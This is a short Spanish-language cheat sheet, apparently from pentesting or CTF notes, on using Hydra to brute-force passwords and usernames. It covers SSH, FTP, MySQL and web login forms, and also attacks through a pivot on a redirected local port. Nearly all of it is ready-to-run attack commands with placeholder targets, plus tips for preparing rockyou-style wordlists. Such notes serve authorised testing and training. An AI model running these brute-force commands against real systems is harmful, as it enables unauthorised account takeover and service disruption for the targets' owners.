# Hydra: Ataques de Fuerza Bruta

Hydra automatiza ataques de contraseña contra multiples protocolos (SSH, FTP, HTTP, MySQL, etc.).

## Diccionarios Recomendados

```bash
# Usuarios
/usr/share/wordlists/metasploit/unix_users.txt

# Contraseñas
/usr/share/wordlists/rockyou.txt
/usr/share/wordlists/metasploit/unix_passwords.txt
```

## Invertir el Diccionario

Las contrasenas suelen estar al final de `rockyou.txt`. Invertir el orden ahorra tiempo.

```bash
tac /usr/share/wordlists/rockyou.txt > rockyou_invertido.txt
```

> Revisar el archivo generado para verificar que es correcto.

## Limpiar Espacios del Diccionario

Algunas contrasenas tienen espacios que pueden causar errores.

```bash
cat rockyou_invertido.txt | tr -d ' ' > diccionario_sin_espacios.txt
```

```bash
hydra -l <usuario> -P diccionario_sin_espacios.txt <mysql>://<IP_objetivo> -t 20 -I
```

## Fuerza Bruta a Contraseñas (SSH y FTP)

```bash
hydra -l <usuario> -P /usr/share/wordlists/rockyou.txt ssh://<IP_objetivo>
```

```bash
hydra -l <usuario> -P /usr/share/wordlists/rockyou.txt ftp://<IP_objetivo>
```

## Fuerza Bruta a Usuarios (SSH y FTP)

```bash
hydra -L /usr/share/wordlists/metasploit/unix_users.txt -p <contraseña> ssh://<IP_objetivo>
```

```bash
hydra -L /usr/share/wordlists/metasploit/unix_users.txt -p <contraseña> ftp://<IP_objetivo>
```

## Fuerza Bruta a Paneles de Login Web

Primero se intercepta la peticion POST con BurpSuite para ver los parametros.

```bash
hydra -l admin -P <diccionario> <IP> http-post-form "/ruta/login.php:usuario=admin&password=^PASS^:<texto_error>" -t 64 -F
```

> `^PASS^` es donde Hydra inserta cada contraseña del diccionario.

## Fuerza Bruta con Pivoting

Cuando el servicio esta detras de un pivot, se ataca contra localhost en el puerto redirigido.

```bash
hydra -l <usuario> -P /usr/share/wordlists/rockyou.txt ssh://127.0.0.1 -s 222
```
